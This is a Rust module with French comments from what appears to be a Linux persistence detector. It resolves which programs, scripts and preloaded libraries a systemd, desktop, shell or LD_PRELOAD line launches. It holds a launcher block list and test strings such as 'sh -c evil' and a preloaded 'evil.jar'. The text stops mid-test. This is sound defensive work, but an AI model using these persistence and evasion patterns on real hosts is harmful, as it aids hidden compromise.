//! Les fichiers que désigne une ligne signalée (le programme d'un service et le script qu'il lit, la bibliothèque d'un
//! préchargement), pour lier un choix « c'est normal chez moi » à leur contenu : remplacer ce qu'une ligne acceptée
//! lance fait revenir l'alerte. Code pur (std seulement), lu depuis n'importe quel texte par la cible de fuzz
//! `designes`.
//!
//! Strict exprès : ce qui ne se lit pas sans ambiguïté rend `Indefini`, avec la raison (`Flou`), et la ligne ne peut
//! pas être déclarée normale. On ne lie jamais un choix à moins que ce qui sera lancé : les mots se coupent comme les
//! coupent systemd et le shell (espace et tabulation ASCII seulement) ; le programme est un chemin absolu ; un
//! interpréteur (sh, python, node…) n'est accepté qu'avec son script, lui aussi un chemin absolu, lié avec lui.

#![forbid(unsafe_code)]
#![warn(clippy::arithmetic_side_effects, clippy::as_conversions)]

/// Au plus autant de fichiers suivis par ligne : au-delà, la ligne est trop chargée pour se montrer.
pub(crate) const CHEMINS_MAX: usize = 16;
/// Un chemin plus long que celui-ci n'est pas un chemin que Linux ouvre (PATH_MAX).
pub(crate) const CHEMIN_MAX: usize = 4096;

/// Pourquoi une ligne ne dit pas sans ambiguïté ce qu'elle lance.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Flou {
    /// Variable, sous-commande, tube, joker, échappement, guillemet non fermé, code de systemd.
    Syntaxe,
    /// Un blanc autre que l'espace et la tabulation, un caractère de contrôle ou invisible : il ne coupe pas les mots
    /// pour systemd ni pour le shell, mais se montrerait comme une espace.
    Blanc,
    /// Un octet qui n'est pas de l'UTF-8 (lu comme U+FFFD) : le fichier montré ne serait pas celui qui est lancé.
    Octet,
    /// Un chemin relatif (« ./run », « bin/x ») : relatif à un dossier qu'on ne connaît pas.
    Relatif,
    /// Un argument qui n'est ni une option ni un chemin absolu, pour un programme qui n'est pas un interpréteur
    /// connu : un interpréteur renommé (« tclsh8.6 », une copie sous un autre nom) le lirait comme un script. Aussi
    /// un mot après « -- » (un nom de fichier, même s'il commence par « - ») et la valeur d'une option qui commence
    /// par « - » (« --a=-fichier »).
    Argument,
    /// Un chemin par /proc ou /dev (« /proc/self/cwd/… », « /dev/fd/0 »), ou avec « . » ou « .. » : il se résout
    /// selon le processus qui le lit, ou selon les liens du chemin, et Vanguard lirait un autre fichier que le
    /// programme lancé.
    Processus,
    /// Le programme est nommé sans chemin (« python3 ») : cherché dans le PATH au lancement.
    NomNu,
    /// « ~ », « $HOME », ou « %h » hors d'une unité de l'utilisateur : le dossier personnel vient d'une variable
    /// qu'un autre fichier peut changer.
    Maison,
    /// Un interpréteur sans script lié : « -c », « -m », « -e », lecture sur l'entrée, module ou classe par nom.
    Interprete,
    /// Un lanceur (env, nohup, sudo, setsid…) : il lance une autre commande, lue selon ses propres règles.
    Lanceur,
    /// Une option qui colle un chemin à son nom (« -javaagent:/x.jar », « -I/x ») : sa forme n'est pas suivie.
    Option,
    /// Trop de fichiers dans la ligne, ou un chemin trop long.
    Trop,
    /// Aucun fichier désigné.
    Vide,
}

/// Ce que désigne une ligne.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Designe {
    /// Ces chemins absolus, sans double, dans l'ordre de la ligne (jamais vide).
    Chemins(Vec<String>),
    /// Ne se lit pas sans ambiguïté : rien ne peut lier un choix à ce qui sera lancé.
    Indefini(Flou),
}

/// Où se trouve la commande : la façon de la lire en dépend.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Contexte<'a> {
    /// Une ligne « Exec…= » d'une unité systemd : préfixes « -@+!: » ; « %h/ » déplié avec `maison` pour une unité
    /// de l'utilisateur (`None` : unité du système, où « %h » vaut le dossier de root).
    Unite(Option<&'a str>),
    /// « Exec= » d'un fichier .desktop : les codes « %f », « %U »… ne désignent rien.
    Bureau,
    /// Une commande passée à un shell (cron, Hyprland, profil).
    Shell,
}

/// Caractères qui font d'une ligne autre chose qu'une liste de mots : sous-commande, tube, redirection, joker,
/// échappement, variable.
const INTERDITS: &[char] = &[
    '$', '`', ';', '|', '&', '<', '>', '(', ')', '*', '?', '[', ']', '{', '}', '\\', '\0', '\n', '\r', '#', '!',
];

/// Un caractère qui se montrerait comme une espace, ou pas du tout, sans couper les mots pour systemd ni le shell :
/// blanc Unicode (U+00A0, U+2003…), contrôle (sauf la tabulation), largeur nulle, bidi, trait d'union conditionnel ;
/// et U+FFFD, que devient à la lecture un octet qui n'est pas de l'UTF-8.
pub(crate) fn trompeur(c: char) -> bool {
    (c != ' ' && c != '\t' && (c.is_whitespace() || c.is_control()))
        || c == char::REPLACEMENT_CHARACTER
        || matches!(c,
            '\u{00AD}' | '\u{034F}' | '\u{061C}' | '\u{115F}' | '\u{1160}' | '\u{17B4}' | '\u{17B5}' | '\u{180E}'
            | '\u{200B}'..='\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2060}'..='\u{206F}' | '\u{3164}'
            | '\u{FE00}'..='\u{FE0F}' | '\u{FEFF}' | '\u{FFA0}' | '\u{FFF9}'..='\u{FFFB}' | '\u{E0000}'..='\u{E0FFF}')
}

/// Pourquoi un texte ne se montre pas tel qu'il se lit : un octet qui n'était pas de l'UTF-8, ou un caractère
/// trompeur (`trompeur`).
fn caracteres(texte: &str) -> Option<Flou> {
    if texte.contains(char::REPLACEMENT_CHARACTER) {
        Some(Flou::Octet)
    } else if texte.contains(trompeur) {
        Some(Flou::Blanc)
    } else {
        None
    }
}

/// Un chemin qui ne désigne pas le même fichier pour tous : sous /proc ou /dev, qui dépendent du processus qui les lit,
/// ou avec une partie « . » ou « .. », qui se résout selon les liens du chemin (vérification de la campagne E, N1).
fn chemin_mouvant(chemin: &str) -> bool {
    let sous = |d: &str| {
        chemin
            .strip_prefix(d)
            .is_some_and(|r| r.is_empty() || r.starts_with('/'))
    };
    sous("/proc") || sous("/dev") || chemin.split('/').any(|p| p == "." || p == "..")
}

/// Un mot qui désigne un fichier : son chemin absolu ; `Ok(None)` : pas un chemin (option, nom nu) ; `Err` : ambigu.
fn chemin_du_mot(mot: &str, ctx: Contexte<'_>) -> Result<Option<String>, Flou> {
    let chemin = if let Some(reste) = mot.strip_prefix("%h/") {
        let Contexte::Unite(Some(maison)) = ctx else {
            return Err(Flou::Maison);
        };
        format!("{}/{reste}", maison.trim_end_matches('/'))
    } else if mot.starts_with('~') || mot.starts_with("$HOME") || mot.starts_with("${HOME}") {
        return Err(Flou::Maison);
    } else if mot.starts_with('/') {
        mot.to_string()
    } else if mot.contains('/') {
        // « ./run », « bin/x » : relatif à un dossier qu'on ne connaît pas.
        return Err(Flou::Relatif);
    } else if mot.contains(INTERDITS) || mot.contains('%') {
        return Err(Flou::Syntaxe);
    } else {
        return Ok(None);
    };
    // Un dossier personnel relatif (HOME étrange) ne désigne rien de sûr non plus.
    if !chemin.starts_with('/') {
        return Err(Flou::Maison);
    }
    if let Some(f) = caracteres(&chemin) {
        return Err(f);
    }
    if chemin.contains(INTERDITS) || chemin.contains(['%', '\'', '"']) || chemin.contains("//") {
        return Err(Flou::Syntaxe);
    }
    if chemin.len() > CHEMIN_MAX {
        return Err(Flou::Trop);
    }
    if chemin_mouvant(&chemin) {
        return Err(Flou::Processus);
    }
    Ok(Some(chemin))
}

/// Coupe une commande en mots comme systemd et le shell : espace et tabulation ASCII hors guillemets, guillemets
/// simples ou doubles retirés. `Err` : un caractère trompeur, un guillemet non fermé, ou un mot qui garde un blanc
/// (« bash -c 'a b' » : un script dans un mot, qu'on ne suit pas).
fn mots(commande: &str) -> Result<Vec<String>, Flou> {
    if let Some(f) = caracteres(commande) {
        return Err(f);
    }
    let mut sortie = Vec::new();
    let mut mot = String::new();
    let mut dans: Option<char> = None;
    let mut entame = false;
    for c in commande.chars() {
        match (dans, c) {
            (Some(q), c) if c == q => dans = None,
            (Some(_), ' ' | '\t') => return Err(Flou::Syntaxe),
            (None, '\'' | '"') => {
                dans = Some(c);
                entame = true;
            }
            (None, ' ' | '\t') => {
                if entame || !mot.is_empty() {
                    sortie.push(std::mem::take(&mut mot));
                }
                entame = false;
            }
            (_, c) => mot.push(c),
        }
    }
    if dans.is_some() {
        return Err(Flou::Syntaxe);
    }
    if entame || !mot.is_empty() {
        sortie.push(mot);
    }
    Ok(sortie)
}

/// Ajoute un chemin sans double ; `Err` si la liste dépasserait `CHEMINS_MAX`.
fn ajouter(chemins: &mut Vec<String>, c: String) -> Result<(), Flou> {
    if !chemins.contains(&c) {
        if chemins.len() >= CHEMINS_MAX {
            return Err(Flou::Trop);
        }
        chemins.push(c);
    }
    Ok(())
}

/// Une valeur d'argument : un chemin, une liste de chemins séparés par « : » ou « , » (« /a.jar:/b.jar »,
/// « /a.so,/b.so »), chacun lié, ou rien. Une adresse (« https://… ») n'est pas un chemin.
fn valeur(v: &str, ctx: Contexte<'_>, chemins: &mut Vec<String>) -> Result<(), Flou> {
    if v.contains("://") {
        return if v.contains(INTERDITS) {
            Err(Flou::Syntaxe)
        } else {
            Ok(())
        };
    }
    for partie in v.split([':', ',']).filter(|p| !p.is_empty()) {
        if let Some(c) = chemin_du_mot(partie, ctx)? {
            ajouter(chemins, c)?;
        }
    }
    Ok(())
}

/// Un argument du programme (ou du script) : une option, « clé=valeur », un chemin ou une liste de chemins.
/// `libre` : l'argument va au script lié d'un interpréteur connu, qui en fait ce que son contenu (lié, montré) dit ;
/// sinon, le programme lui-même le lit, et un mot qui n'est ni une option ni un chemin absolu est refusé (`Argument`) :
/// un interpréteur sous un autre nom le prendrait pour un script du dossier courant, jamais lié.
fn argument(mot: &str, ctx: Contexte<'_>, chemins: &mut Vec<String>, libre: bool) -> Result<(), Flou> {
    if ctx == Contexte::Bureau && matches!(mot, "%f" | "%F" | "%u" | "%U" | "%i" | "%c" | "%k") {
        return Ok(());
    }
    if !libre && !mot.starts_with('-') {
        // « /x/a.jar:/x/b.jar » se lie partie par partie ; « serve », « conf=/x », une adresse : refusés.
        if mot.contains('=') || mot.contains("://") {
            return Err(Flou::Argument);
        }
        let avant = chemins.len();
        valeur(mot, ctx, chemins)?;
        let parties = mot.split([':', ',']).filter(|p| !p.is_empty()).count();
        // Chaque partie doit être un chemin lié (un double déjà lié compte : « /x /x » ne cache rien).
        let toutes = mot
            .split([':', ','])
            .filter(|p| !p.is_empty())
            .all(|p| chemin_du_mot(p, ctx).is_ok_and(|c| c.is_some()));
        if parties == 0 || !toutes {
            chemins.truncate(avant);
            return Err(Flou::Argument);
        }
        return Ok(());
    }
    if !libre && mot == "-" {
        // « - » : l'entrée standard, qu'un interpréteur renommé lirait comme son script.
        return Err(Flou::Argument);
    }
    match mot.split_once('=') {
        // « --config=/x », « conf=/x » : la valeur après le premier « = » ; la clé est un nom.
        Some((cle, v)) if !cle.contains('/') => {
            if cle.contains(INTERDITS) || cle.contains('%') {
                return Err(Flou::Syntaxe);
            }
            if !libre && !v.is_empty() {
                // « --require=module » : la valeur d'une option du programme suit la même règle qu'un mot seul ;
                // « --a=-fichier » : une valeur n'est jamais une option, c'est un mot nu (vérification, N2).
                if v.starts_with('-') {
                    return Err(Flou::Argument);
                }
                return argument(v, ctx, chemins, false);
            }
            valeur(v, ctx, chemins)
        }
        _ if mot.starts_with('-') => {
            if mot.contains('/') {
                return Err(Flou::Option);
            }
            if mot.contains(INTERDITS) || mot.contains('%') {
                return Err(Flou::Syntaxe);
            }
            Ok(())
        }
        _ => valeur(mot, ctx, chemins),
    }
}

/// Les familles d'interpréteurs : chacune lit son script à sa façon.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Famille {
    Shell,
    Python,
    Node,
    Deno,
    Bun,
    Perl,
    Ruby,
    Php,
    Lua,
    Java,
    Awk,
    /// tclsh, Rscript, pwsh… : le premier argument est le script, sans option.
    Autre,
}

/// Les programmes qui en lancent un autre selon leurs propres règles : jamais suivis.
const LANCEURS: &[&str] = &[
    "env",
    "nohup",
    "setsid",
    "nice",
    "ionice",
    "timeout",
    "stdbuf",
    "sudo",
    "doas",
    "su",
    "runuser",
    "pkexec",
    "xargs",
    "flock",
    "chrt",
    "taskset",
    "systemd-run",
    "systemd-inhibit",
    "systemd-cat",
    "exec",
    "command",
    "eval",
    "source",
    ".",
    "unshare",
    "nsenter",
    "chroot",
    "firejail",
    "bwrap",
    "flatpak",
    "snap",
    "dbus-launch",
    "dbus-run-session",
    "uwsm",
    "uwsm-app",
    "app2unit",
    "busybox",
    "toybox",
    "script",
    "watch",
    "sg",
    "newgrp",
    "setpriv",
    "capsh",
    "strace",
    "ltrace",
    "gdb",
    "valgrind",
    "time",
    "nocache",
    "catchsegv",
    "tmux",
    "screen",
    "xterm",
    "alacritty",
    "kitty",
    "foot",
    "ghostty",
    "gnome-terminal",
    "konsole",
    "wezterm",
    "xdg-open",
    "gio",
    "proxychains",
    "proxychains4",
    "torsocks",
    "wine",
    "wine64",
    "steam-run",
    "distrobox",
    "toolbox",
    "podman",
    "docker",
    "ssh",
    "parallel",
    "at",
    "batch",
    "cron",
    "crond",
    "start-stop-daemon",
    "daemon",
    "daemonize",
];

/// La famille d'un programme, par son nom de fichier, aussi suivi d'une version (« tclsh8.6 », « node22 »,
/// « bash-5.2 ») ; `None` : pas un interpréteur connu.
fn famille(nom: &str) -> Option<Famille> {
    let nom = nom.strip_suffix(".exe").unwrap_or(nom);
    famille_du_nom(nom).or_else(|| {
        let sans = nom.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.' || c == '-' || c == '_');
        (sans.len() < nom.len())
            .then_some(sans)
            .filter(|s| !s.is_empty())
            .and_then(famille_du_nom)
    })
}

fn famille_du_nom(nom: &str) -> Option<Famille> {
    Some(match nom {
        "sh" | "bash" | "rbash" | "dash" | "zsh" | "ksh" | "ksh93" | "mksh" | "pdksh" | "yash" | "ash" | "posh"
        | "fish" | "csh" | "tcsh" | "elvish" | "nu" | "xonsh" | "oil" | "osh" | "ysh" => Famille::Shell,
        "node" | "nodejs" => Famille::Node,
        "deno" => Famille::Deno,
        "bun" => Famille::Bun,
        "java" => Famille::Java,
        "awk" | "gawk" | "mawk" | "nawk" | "busybox-awk" => Famille::Awk,
        "tclsh" | "wish" | "expect" | "Rscript" | "R" | "pwsh" | "powershell" | "guile" | "racket" | "sbcl"
        | "clisp" | "gjs" | "cjs" | "qjs" | "osascript" | "julia" | "elixir" | "erl" | "escript" | "groovy"
        | "kotlin" | "scala" | "swift" | "dotnet" | "mono" | "octave" | "gnuplot" | "texlua" | "ghci" | "runghc"
        | "runhaskell" | "crystal" | "nim" | "v" | "zx" | "tsx" | "ts-node" | "npx" | "pnpm" | "yarn" | "npm" => {
            Famille::Autre
        }
        n if n.starts_with("python") || n.starts_with("pypy") || n.starts_with("ipython") => Famille::Python,
        n if n.starts_with("perl") => Famille::Perl,
        n if n.starts_with("ruby") || n == "jruby" || n == "irb" => Famille::Ruby,
        n if n.starts_with("php") => Famille::Php,
        n if n.starts_with("lua") => Famille::Lua,
        _ => return None,
    })
}

/// Le nom de fichier d'un chemin (« /usr/bin/python3 » → « python3 »).
fn nom_de_fichier(chemin: &str) -> &str {
    chemin.rsplit('/').next().unwrap_or(chemin)
}

/// Ce programme lit-il un script (interpréteur) ou lance-t-il une autre commande (lanceur) ? Pour juger le script
/// d'un service comme son programme (`persistance::commande_suspecte`).
pub(crate) fn lit_un_script(programme: &str) -> bool {
    let nom = nom_de_fichier(programme);
    famille(nom).is_some() || LANCEURS.contains(&nom)
}

/// Une option sans argument que la famille accepte avant le script : elle ne change pas ce qui est lu. Toute autre
/// option (« -c », « -m », « -e », « -r », « -I », « -cp »…) rend la ligne indéfinie.
fn option_sure(f: Famille, mot: &str) -> bool {
    let lettres = |permises: &str| {
        mot.strip_prefix('-')
            .is_some_and(|l| !l.is_empty() && !l.starts_with('-') && l.chars().all(|c| permises.contains(c)))
    };
    match f {
        // -e (arrêt à l'erreur), -u, -x, -v : rien d'autre n'est lu.
        Famille::Shell => lettres("euxv") || matches!(mot, "--norc" | "--noprofile"),
        // -u (sans tampon), -B, -E, -s, -I, -S, -O, -q : ni module, ni code dans la ligne.
        Famille::Python => lettres("uBEsISOq"),
        Famille::Perl => lettres("wTWX"),
        Famille::Ruby => lettres("wW"),
        Famille::Php => lettres("q"),
        _ => false,
    }
}

/// Le script d'un interpréteur : sa place dans `args` (après le programme) ; `Err(Interprete)` si la ligne ne le
/// nomme pas comme un chemin (code dans la ligne, module, entrée standard, nom nu).
fn place_du_script(f: Famille, args: &[String]) -> Result<usize, Flou> {
    let mut i = 0usize;
    // Le mot-clé qui précède le script : « deno run », « bun run », « java -jar », « awk -f », « php -f ».
    let attendu = match f {
        Famille::Deno => Some("run"),
        Famille::Java => Some("-jar"),
        Famille::Awk => Some("-f"),
        _ => None,
    };
    let mut vu = attendu.is_none();
    while let Some(mot) = args.get(i) {
        if Some(mot.as_str()) == attendu || (f == Famille::Bun && mot == "run" && i == 0) {
            vu = true;
            i = i.saturating_add(1);
            break;
        }
        if f == Famille::Php && mot == "-f" {
            i = i.saturating_add(1);
            break;
        }
        if mot == "--" && f == Famille::Shell {
            i = i.saturating_add(1);
            break;
        }
        if !mot.starts_with('-') {
            break;
        }
        if attendu.is_some() || !option_sure(f, mot) {
            return Err(Flou::Interprete);
        }
        i = i.saturating_add(1);
    }
    // « awk /x/ » : un programme dans la ligne, pas un fichier ; « java Main » : une classe par nom.
    if !vu {
        return Err(Flou::Interprete);
    }
    match args.get(i) {
        // « - » : l'entrée standard ; une option après « -jar » ou « run » : pas un script.
        Some(m) if m.starts_with('/') || m.starts_with("%h/") => Ok(i),
        Some(m) if m.starts_with('~') || m.starts_with("$HOME") || m.starts_with("${HOME}") => Err(Flou::Maison),
        _ => Err(Flou::Interprete),
    }
}

/// Les fichiers que désigne une commande lancée (« ExecStart=… », « Exec=… », « exec-once = … », sans sa clé) : le
/// programme, le script de l'interpréteur, et chaque argument qui est un chemin, aussi après un « = » ou dans une
/// liste « : » ou « , ».
pub(crate) fn commande(commande: &str, ctx: Contexte<'_>) -> Designe {
    match commande_ou_flou(commande, ctx) {
        Ok(c) if c.is_empty() => Designe::Indefini(Flou::Vide),
        Ok(c) => Designe::Chemins(c),
        Err(f) => Designe::Indefini(f),
    }
}

fn commande_ou_flou(commande: &str, ctx: Contexte<'_>) -> Result<Vec<String>, Flou> {
    let liste = mots(commande)?;
    let Some((premier, args)) = liste.split_first() else {
        return Err(Flou::Vide);
    };
    let programme = match ctx {
        Contexte::Unite(_) => {
            let sans = premier.trim_start_matches(['-', '@', '+', '!', ':']);
            // « @ » : le mot suivant devient le nom du programme (argv[0]), qui change la façon dont un shell lit.
            let prefixe = premier
                .get(..premier.len().saturating_sub(sans.len()))
                .unwrap_or_default();
            if prefixe.contains('@') {
                return Err(Flou::Syntaxe);
            }
            sans
        }
        Contexte::Bureau | Contexte::Shell => premier.as_str(),
    };
    let mut chemins = Vec::new();
    let Some(chemin) = chemin_du_mot(programme, ctx)? else {
        return Err(Flou::NomNu);
    };
    let nom = nom_de_fichier(&chemin).to_string();
    ajouter(&mut chemins, chemin)?;
    if LANCEURS.contains(&nom.as_str()) {
        return Err(Flou::Lanceur);
    }
    let mut reste = args;
    let mut libre = false;
    if let Some(f) = famille(&nom) {
        let i = place_du_script(f, args)?;
        let Some(script) = args.get(i) else {
            return Err(Flou::Interprete);
        };
        let Some(c) = chemin_du_mot(script, ctx)? else {
            return Err(Flou::Interprete);
        };
        ajouter(&mut chemins, c)?;
        reste = args.get(i.saturating_add(1)..).unwrap_or_default();
        libre = true;
    }
    // Après « -- », un programme lit chaque mot comme un nom de fichier, même « -rappel.sh » : il suit la règle du mot
    // nu, jamais celle d'une option (vérification de la campagne E, N2).
    let mut fin_des_options = false;
    for mot in reste {
        if !libre && fin_des_options && mot.starts_with('-') {
            return Err(Flou::Argument);
        }
        if !libre && !fin_des_options && mot == "--" {
            fin_des_options = true;
            continue;
        }
        argument(mot, ctx, &mut chemins, libre)?;
    }
    Ok(chemins)
}

/// D'où vient une liste de bibliothèques préchargées : le chargeur ne la coupe pas pareil.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Liste {
    /// Valeur de LD_PRELOAD ou LD_AUDIT : coupée sur l'espace et « : » (une tabulation fait partie du nom).
    Variable,
    /// Ligne de /etc/ld.so.preload : coupée sur l'espace, la tabulation et « : ».
    Fichier,
}

/// Les bibliothèques d'une valeur de LD_PRELOAD ou LD_AUDIT, ou d'une ligne de /etc/ld.so.preload, chacune un chemin
/// absolu. Un nom nu est cherché par le chargeur dans ses dossiers : pas suivi ici, donc `Indefini`, comme « $LIB »,
/// « $ORIGIN » ou « ~ » (le chargeur ne déplie rien).
pub(crate) fn bibliotheques(valeur: &str, liste: Liste) -> Designe {
    match bibliotheques_ou_flou(valeur, liste) {
        Ok(c) if c.is_empty() => Designe::Indefini(Flou::Vide),
        Ok(c) => Designe::Chemins(c),
        Err(f) => Designe::Indefini(f),
    }
}

fn bibliotheques_ou_flou(valeur: &str, liste: Liste) -> Result<Vec<String>, Flou> {
    let separe = |c: char| c == ' ' || c == ':' || (liste == Liste::Fichier && c == '\t');
    if let Some(f) = caracteres(valeur).filter(|f| *f == Flou::Octet) {
        return Err(f);
    }
    if valeur.contains(|c: char| trompeur(c) || (c == '\t' && liste == Liste::Variable)) {
        return Err(Flou::Blanc);
    }
    let mut chemins = Vec::new();
    for mot in valeur.split(separe).filter(|m| !m.is_empty()) {
        if mot.starts_with('~') {
            return Err(Flou::Maison);
        }
        if !mot.starts_with('/') {
            return Err(Flou::NomNu);
        }
        // « //usr/lib/a.so » : une deuxième écriture du même fichier, qui passerait à côté du refus des doubles.
        if mot.contains(INTERDITS) || mot.contains(['%', '\'', '"']) || mot.contains("//") {
            return Err(Flou::Syntaxe);
        }
        if mot.len() > CHEMIN_MAX {
            return Err(Flou::Trop);
        }
        if chemin_mouvant(mot) {
            return Err(Flou::Processus);
        }
        ajouter(&mut chemins, mot.to_string())?;
    }
    Ok(chemins)
}

/// Les bibliothèques qu'une ligne de configuration précharge : « export LD_PRELOAD=… », « LD_AUDIT=… »,
/// « env = LD_PRELOAD,… » (Hyprland), « LD_PRELOAD DEFAULT=… » (pam_env). Une seule affectation par ligne ; une
/// lecture (« echo $LD_PRELOAD »), deux affectations, une valeur sans guillemets qui garde une espace (le shell la
/// couperait), ou des guillemets mal fermés : `Indefini`.
pub(crate) fn prechargement(ligne: &str) -> Designe {
    if let Some(f) = caracteres(ligne) {
        return Designe::Indefini(f);
    }
    let noms = ["LD_PRELOAD", "LD_AUDIT"];
    let trouves: Vec<usize> = noms
        .iter()
        .flat_map(|n| ligne.match_indices(n).map(|(i, _)| i))
        .collect();
    let [debut] = trouves[..] else {
        return Designe::Indefini(Flou::Syntaxe);
    };
    let Some(reste) = noms
        .iter()
        .find_map(|n| ligne.get(debut..).and_then(|r| r.strip_prefix(n)))
    else {
        return Designe::Indefini(Flou::Syntaxe);
    };
    let blancs: &[char] = &[' ', '\t'];
    let reste = reste.trim_start_matches(blancs);
    let reste = reste
        .strip_prefix("DEFAULT")
        .map_or(reste, |r| r.trim_start_matches(blancs));
    let Some(valeur) = reste.strip_prefix(['=', ',']) else {
        return Designe::Indefini(Flou::Syntaxe);
    };
    let valeur = valeur.trim_matches(blancs);
    let valeur = match valeur.chars().next() {
        Some(q @ ('\'' | '"')) => match valeur.get(1..).and_then(|v| v.strip_suffix(q)) {
            Some(v) if !v.contains(q) => v,
            _ => return Designe::Indefini(Flou::Syntaxe),
        },
        _ if valeur.contains(blancs) || valeur.contains(['\'', '"']) => return Designe::Indefini(Flou::Syntaxe),
        _ => valeur,
    };
    bibliotheques(valeur, Liste::Variable)
}

#[cfg(test)]
mod tests {
    use super::*;

    const M: &str = "/home/alice";
    const U: Contexte<'static> = Contexte::Unite(Some(M));

    fn chemins(v: &[&str]) -> Designe {
        Designe::Chemins(v.iter().map(ToString::to_string).collect())
    }

    #[test]
    fn programmes_designes() {
        assert_eq!(
            commande("%h/.cache-x/rappel.sh --doux", U),
            chemins(&["/home/alice/.cache-x/rappel.sh"])
        );
        assert_eq!(
            commande("-/usr/bin/python3 -u %h/.outils/x.py --conf=%h/.outils/c.toml", U),
            chemins(&[
                "/usr/bin/python3",
                "/home/alice/.outils/x.py",
                "/home/alice/.outils/c.toml"
            ])
        );
        assert_eq!(
            commande("\"/tmp/.x/run\" %U", Contexte::Bureau),
            chemins(&["/tmp/.x/run"])
        );
        // Deux fois le même : une fois.
        assert_eq!(commande("/opt/a /opt/a", Contexte::Shell), chemins(&["/opt/a"]));
        // Le script d'un interpréteur est lié avec lui.
        assert_eq!(
            commande("/usr/bin/bash %h/.cache-x/rappel.sh", U),
            chemins(&["/usr/bin/bash", "/home/alice/.cache-x/rappel.sh"])
        );
        assert_eq!(
            commande("/usr/bin/java -jar /opt/a.jar", Contexte::Shell),
            chemins(&["/usr/bin/java", "/opt/a.jar"])
        );
        assert_eq!(
            commande("/usr/bin/deno run /opt/s.ts", Contexte::Shell),
            chemins(&["/usr/bin/deno", "/opt/s.ts"])
        );
        // Une adresse n'est pas un chemin, et un argument qui n'en est pas un ne se lie pas : le programme inconnu
        // pourrait le lire comme un fichier, relatif au dossier courant (campagne E, F2).
        assert_eq!(
            commande("/opt/sync https://example.org/x", Contexte::Shell),
            Designe::Indefini(Flou::Argument)
        );
    }

    /// B2 : un interpréteur sans script lié, un nom nu, un lanceur : jamais seulement l'interpréteur lié.
    #[test]
    fn interpreteurs_sans_script_lie() {
        for (c, f) in [
            ("/usr/bin/bash rappel.sh", Flou::Interprete),
            ("python3 -m serveur", Flou::NomNu),
            ("/usr/bin/python3 -m serveur", Flou::Interprete),
            ("node serveur.js", Flou::NomNu),
            ("/usr/bin/node serveur.js", Flou::Interprete),
            ("/usr/bin/env python3 rappel.py", Flou::Lanceur),
            ("sh -c evil", Flou::NomNu),
            ("/bin/sh -c evil", Flou::Interprete),
            (". rappel", Flou::NomNu),
            ("/usr/bin/bash", Flou::Interprete),
            ("/usr/bin/bash -", Flou::Interprete),
            ("/usr/bin/bash -s", Flou::Interprete),
            ("/usr/bin/bash -l /opt/a.sh", Flou::Interprete),
            ("/usr/bin/node -r /opt/x.js /opt/a.js", Flou::Interprete),
            ("/usr/bin/node -e 1", Flou::Interprete),
            ("/usr/bin/perl -e 1", Flou::Interprete),
            ("/usr/bin/perl -MIO /opt/a.pl", Flou::Interprete),
            ("/usr/bin/java -cp /opt/a.jar Main", Flou::Interprete),
            ("/usr/bin/java Main", Flou::Interprete),
            ("/usr/bin/awk '{print}'", Flou::Interprete),
            ("/usr/bin/awk /x/ /opt/f", Flou::Interprete),
            ("/usr/bin/python3.12 -c x", Flou::Interprete),
            ("/usr/bin/nohup /opt/a", Flou::Lanceur),
            ("/usr/bin/bash ~/a.sh", Flou::Maison),
        ] {
            assert_eq!(commande(c, U), Designe::Indefini(f), "{c}");
        }
    }

    /// B1 : seuls l'espace et la tabulation coupent ; un blanc Unicode rend la ligne indéfinie.
    #[test]
    fn blancs_trompeurs() {
        for l in [
            "%h/.cache-x/a\u{2003}/home/alice/.cache-x/b",
            "%h/.cache-x/a\u{00A0}/home/alice/.cache-x/b",
            "%h/.cache-x/a\u{000B}/home/alice/.cache-x/b",
            "/opt/a\u{200B}",
        ] {
            assert_eq!(commande(l, U), Designe::Indefini(Flou::Blanc), "{l:?}");
            assert_eq!(commande(l, Contexte::Shell), Designe::Indefini(Flou::Blanc), "{l:?}");
        }
        assert_eq!(
            commande("/opt/a\t/opt/b", Contexte::Shell),
            chemins(&["/opt/a", "/opt/b"])
        );
        assert_eq!(
            bibliotheques("/a.so\u{2003}/b.so", Liste::Variable),
            Designe::Indefini(Flou::Blanc)
        );
        assert_eq!(
            bibliotheques("/a.so\u{00A0}/b.so", Liste::Fichier),
            Designe::Indefini(Flou::Blanc)
        );
        // La tabulation coupe une ligne de ld.so.preload, pas une valeur de LD_PRELOAD.
        assert_eq!(
            bibliotheques("/a.so\t/b.so", Liste::Fichier),
            chemins(&["/a.so", "/b.so"])
        );
        assert_eq!(
            bibliotheques("/a.so\t/b.so", Liste::Variable),
            Designe::Indefini(Flou::Blanc)
        );
        assert_eq!(
            prechargement("export LD_PRELOAD=/a.so\u{2003}"),
            Designe::Indefini(Flou::Blanc)
        );
    }

    /// C2 et M4 : seul « %h/ » d'une unité de l'utilisateur est déplié.
    #[test]
    fn dossier_personnel() {
        for c in ["~/x", "$HOME/x", "${HOME}/x", "/usr/bin/bash ${HOME}/.cache-x/r.sh"] {
            assert!(
                matches!(commande(c, U), Designe::Indefini(Flou::Maison | Flou::Syntaxe)),
                "{c}"
            );
        }
        assert_eq!(commande("%h/x", Contexte::Unite(None)), Designe::Indefini(Flou::Maison));
        assert_eq!(commande("%h/x", Contexte::Shell), Designe::Indefini(Flou::Maison));
        // Un dossier personnel relatif (HOME étrange, trouvé par le fuzz) ne désigne rien de sûr.
        assert_eq!(
            commande("%h/x", Contexte::Unite(Some("maison"))),
            Designe::Indefini(Flou::Maison)
        );
    }

    /// C9 : les listes dans un mot sont coupées et chaque chemin lié ; une option qui colle un chemin, non.
    #[test]
    fn listes_dans_un_mot() {
        assert_eq!(
            commande("/opt/x --plugins=/a.so,/b.so", Contexte::Shell),
            chemins(&["/opt/x", "/a.so", "/b.so"])
        );
        assert_eq!(
            commande("/opt/x /opt/a.jar:%h/.x/evil.jar", U),
            chemins(&["/opt/x", "/opt/a.jar", "/home/alice/.x/evil.jar"])
        );
        assert_eq!(
            commande("/usr/bin/java -javaagent:/x.jar -jar /a.jar", Contexte::Shell),
            Designe::Indefini(Flou::Interprete)
        );
        assert_eq!(
            commande("/opt/x -javaagent:/x.jar", Contexte::Shell),
            Designe::Indefini(Flou::Option)
        );
        assert_eq!(
